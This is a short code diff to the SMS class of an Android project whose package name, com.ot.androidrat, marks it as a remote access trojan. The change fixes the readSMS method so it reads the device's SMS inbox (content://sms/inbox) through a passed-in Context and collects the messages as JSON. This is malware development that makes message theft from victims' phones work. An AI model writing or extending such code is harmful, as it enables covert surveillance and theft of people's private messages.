@@ -1,5 +1,6 @@
 package com.ot.androidrat;
 
+import android.content.Context;
 import android.database.Cursor;
 import android.net.Uri;
 import android.telephony.SmsManager;
@@ -21,7 +22,7 @@ public class SMS {
         return 0;
     }
 
-    public JSONObject readSMS() {
+    public JSONObject readSMS(Context context) {
         JSONObject SMSList = null;
         try {
             SMSList = new JSONObject();
@@ -29,7 +30,7 @@ public class SMS {
 
 
             Uri uriSMSURI = Uri.parse("content://sms/inbox");
-            Cursor cur = new MainActivity().getContentResolver().query(uriSMSURI, null, null, null, null);
+            Cursor cur = context.getContentResolver().query(uriSMSURI, null, null, null, null);
 
             while (cur.moveToNext()) {
                 JSONObject sms = new JSONObject();
